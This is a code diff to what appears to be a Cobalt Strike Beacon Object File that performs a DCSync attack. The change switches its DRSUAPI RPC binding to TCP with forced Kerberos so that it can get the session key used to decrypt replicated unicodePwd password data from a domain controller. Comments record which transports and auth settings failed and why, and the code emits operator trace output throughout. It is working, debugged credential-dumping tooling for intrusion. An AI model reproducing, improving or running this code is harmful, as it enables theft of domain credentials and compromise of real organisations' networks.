@@ -1280,32 +1280,40 @@ void go(char *args, int args_len)
 
     /* ── Step 3: Create RPC binding to DRSUAPI ──
      *
-     * Transport = ncalrpc (Local Procedure Call over ALPC).
+     * Transport = ncacn_ip_tcp with FORCED KERBEROS.
      *
-     * Why not ncacn_np:\pipe\lsass? On the same-host case (agent runs
-     * on the target DC), Windows' RPC runtime skips SPN lookup for
-     * the named-pipe transport and prefers NTLM. Local LSA refuses
-     * NTLM-to-itself as a loopback-reflection defense — regardless of
-     * the caller's group membership; even Domain Admins get denied —
-     * and the refusal surfaces as RPC_S_ACCESS_DENIED (0x5) at
-     * DRSBind. That's the previous failure this transport replaces.
+     * History of what did NOT work here and why:
      *
-     * ncalrpc rides ALPC and passes the caller's process token to
-     * lsass via the LPC message header — no NTLM handshake, no
-     * Kerberos ticket, no SPN lookup, no loopback-reflection block.
-     * The endpoint is dynamic (LSA registers it at boot) so we let
-     * RpcEpResolveBinding query the local endpoint mapper for the
-     * ALPC port name currently hosting DRSUAPI.
+     *   ncacn_ip_tcp + RpcBindingBind — earlier failed with 0x6E4
+     *     (RPC_S_UNKNOWN_IF). RpcBindingBind was the culprit (undocumented,
+     *     picky about the interface struct). We removed RpcBindingBind
+     *     and let the first authenticated I_RpcSendReceive drive the bind
+     *     PDU, which fixes 0x6E4.
      *
-     * ntdsapi.dll's DsBindW does this exact same-host optimization
-     * internally, which is why the earlier DsBindW succeeded while
-     * the raw ncacn_np path failed with 0x5.
+     *   ncacn_np:\pipe\lsass + NEGOTIATE — 0x5 (ACCESS_DENIED) even for
+     *     Domain Admins. The named-pipe transport short-circuits SPN
+     *     lookup on the same-host case and prefers NTLM; local LSA
+     *     refuses NTLM-to-itself (loopback-reflection defense).
      *
-     * For an off-box target (agent NOT on the DC), swap this back to
-     *   ncacn_np:aDC[\pipe\lsass]
-     * with ServerPrincName = NULL — that combination auto-derives a
-     * HOST/<fqdn> SPN, Kerberos issues a real ticket, and the
-     * loopback issue does not apply since we're actually remote.
+     *   ncalrpc + WINNT — DRSBind succeeds, but WINNT on ncalrpc is a
+     *     token-passing fast path with NO queryable SSPI context, so
+     *     I_RpcBindingInqSecurityContext returns 0x6A6 and we cannot
+     *     get the session key required to decrypt unicodePwd.
+     *
+     *   ncalrpc + KERBEROS — refused with 0x6D3 (UNKNOWN_AUTHN_SERVICE)
+     *     on LTSC-family DCs; Kerberos is often not registered on ncalrpc.
+     *
+     * ncacn_ip_tcp + KERBEROS is the combination that gives us BOTH a
+     * working bind AND a real session key:
+     *
+     *   - TCP loopback (target IP == local IP) is a normal network flow
+     *     for Kerberos — no NTLM anywhere in the picture, so no loopback-
+     *     reflection block.
+     *   - RpcEpResolveBinding queries EPM on the DC (port 135) for
+     *     DRSUAPI's dynamic port.
+     *   - KERBEROS with a real SPN (HOST/<dc_fqdn>) produces a full SSPI
+     *     context; I_RpcBindingInqSecurityContext returns the session key
+     *     we need to build the RC4 key that decrypts unicodePwd.
      */
     BeaconPrintf(CALLBACK_OUTPUT, "[.] trace: init_drsuapi_if\n");
     init_drsuapi_if();
@@ -1313,9 +1321,9 @@ void go(char *args, int args_len)
     RPC_CSTR stringBinding = NULL;
     RPC_BINDING_HANDLE hRpc = NULL;
 
-    BeaconPrintf(CALLBACK_OUTPUT, "[.] trace: RpcStringBindingComposeA (ncalrpc)\n");
+    BeaconPrintf(CALLBACK_OUTPUT, "[.] trace: RpcStringBindingComposeA (ncacn_ip_tcp:%s)\n", aDC);
     RPC_STATUS rpcSt = RPCRT4$RpcStringBindingComposeA(
-        NULL, (RPC_CSTR)"ncalrpc", NULL,
+        NULL, (RPC_CSTR)"ncacn_ip_tcp", (RPC_CSTR)aDC,
         NULL, NULL, &stringBinding);
     BeaconPrintf(CALLBACK_OUTPUT, "[.] trace:   rpcSt=0x%08x binding=%s\n",
                  rpcSt, stringBinding ? (char*)stringBinding : "(null)");
@@ -1327,11 +1335,10 @@ void go(char *args, int args_len)
         RPCRT4$RpcStringFreeA(&stringBinding);
     }
     if (rpcSt == 0) {
-        /* Resolve the ALPC endpoint that hosts DRSUAPI on this box.
-         * ncalrpc endpoints are dynamic, so we ask the local EPM
-         * (\RPC Control\epmapper) for the port name registered
-         * against the DRSUAPI interface UUID. Purely local call. */
-        BeaconPrintf(CALLBACK_OUTPUT, "[.] trace: RpcEpResolveBinding (DRSUAPI on ncalrpc)\n");
+        /* Resolve DRSUAPI's dynamic TCP port via the DC's endpoint
+         * mapper (port 135). This is why previous ncacn_ip_tcp attempts
+         * did NOT reach the DRSUAPI endpoint by themselves. */
+        BeaconPrintf(CALLBACK_OUTPUT, "[.] trace: RpcEpResolveBinding (DRSUAPI on ncacn_ip_tcp)\n");
         rpcSt = RPCRT4$RpcEpResolveBinding(hRpc, (void*)&g_drsuapi_if);
         BeaconPrintf(CALLBACK_OUTPUT, "[.] trace:   rpcSt=0x%08x\n", rpcSt);
     }
@@ -1349,26 +1356,25 @@ void go(char *args, int args_len)
         qos.IdentityTracking  = MY_RPC_C_QOS_IDENTITY_STATIC;
         qos.ImpersonationType = MY_RPC_C_IMP_LEVEL_IMPERSONATE;
 
-        /* Authn service on ncalrpc — order matters:
+        /* Authn service on ncacn_ip_tcp:
          *
-         *   KERBEROS (16) is what we NEED, not just what works. Kerberos
-         *     goes through full SSPI: AcquireCredentialsHandle picks the
-         *     caller's TGT from LSA, InitializeSecurityContext talks to
-         *     the local KDC, and the runtime attaches a real security
-         *     context to the binding with a queryable session key —
-         *     without which we cannot derive the RC4 key that decrypts
-         *     the replicated unicodePwd blob (I_RpcBindingInqSecurityContext
-         *     returns RPC_S_INVALID_BINDING = 0x6A6 if there is no
-         *     context to inquire from). SPN = the DC's HOST/<fqdn> or,
-         *     equivalently, the fqdn alone which SSPI treats as HOST/.
+         *   KERBEROS (16) is what we NEED. Full SSPI: AcquireCreds
+         *     picks the caller's TGT out of LSA, InitializeSecurityContext
+         *     asks the KDC for a service ticket against HOST/<dc_fqdn>
+         *     (the machine account, which is what lsass runs as), and
+         *     the runtime attaches a real security context to the binding
+         *     with a queryable session key. That session key is the input
+         *     to MD5(sessionKey || salt) → RC4 key → decrypted unicodePwd.
+         *     TCP loopback with Kerberos does NOT trigger the NTLM
+         *     loopback-reflection block since NTLM is never in the picture.
          *
-         *   WINNT (10 = NTLMSSP) works over ncalrpc as an ALPC fast-
-         *     path that piggybacks the caller token WITHOUT materializing
-         *     an SSPI context. Fine for calls that only need auth, but
-         *     gives us no session key — DCSync decryption fails.
+         *   NEGOTIATE (9) would work here on TCP but SPNEGO can decide to
+         *     fall back to NTLM if Kerberos hits any snag (clock skew,
+         *     SPN typo, missing TGT) — and NTLM back to lsass on this
+         *     same host still gets refused. Kerberos-only removes that
+         *     failure mode entirely.
          *
-         *   NEGOTIATE (9) is refused on ncalrpc (0x6D3) — SPNEGO has
-         *     nothing to negotiate over ALPC. */
+         *   WINNT (10 = NTLMSSP) on TCP = the loopback-reflection block. */
         char spn[256];
         DWORD spnLen = 0;
         {
@@ -1389,18 +1395,6 @@ void go(char *args, int args_len)
             NULL, 0, &qos);
         BeaconPrintf(CALLBACK_OUTPUT, "[.] trace:   rpcSt=0x%08x\n", rpcSt);
 
-        if (rpcSt == 1747 /* RPC_S_UNKNOWN_AUTHN_SERVICE */) {
-            /* Kerberos not registered on ncalrpc on this build — fall
-             * back to WINNT. DRSBind will still succeed but the later
-             * decrypt step will fail because there is no session key.
-             * The caller will see the error at that point. */
-            BeaconPrintf(CALLBACK_OUTPUT,
-                "[.] trace: KERBEROS not registered — falling back to WINNT (decrypt will fail)\n");
-            rpcSt = RPCRT4$RpcBindingSetAuthInfoExA(hRpc, NULL,
-                RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_WINNT,
-                NULL, 0, &qos);
-            BeaconPrintf(CALLBACK_OUTPUT, "[.] trace:   rpcSt=0x%08x\n", rpcSt);
-        }
         (void)spnLen;
     }
     if (rpcSt) {
@@ -1409,9 +1403,17 @@ void go(char *args, int args_len)
         if (rpcSt == 1753) {
             BeaconPrintf(CALLBACK_ERROR,
                 "[!]   0x6D9 = EPT_S_NOT_REGISTERED. DRSUAPI is not\n"
-                "[!]   registered on ncalrpc here — the agent is likely\n"
-                "[!]   NOT on the DC itself. Change transport back to\n"
-                "[!]   ncacn_np:<dc_fqdn>[\\pipe\\lsass] for remote case.\n");
+                "[!]   registered on the DC's endpoint mapper. Check\n"
+                "[!]   that port 135 is reachable and that lsass has\n"
+                "[!]   registered its DRSUAPI endpoint (rare — this\n"
+                "[!]   only happens on a broken/half-promoted DC).\n");
+        }
+        if (rpcSt == 1747) {
+            BeaconPrintf(CALLBACK_ERROR,
+                "[!]   0x6D3 = RPC_S_UNKNOWN_AUTHN_SERVICE. Kerberos\n"
+                "[!]   is not registered on this transport. Very\n"
+                "[!]   unusual on a domain-joined DC; would suggest\n"
+                "[!]   the machine has lost its domain trust.\n");
         }
         if (hRpc) RPCRT4$RpcBindingFree(&hRpc);
         return;
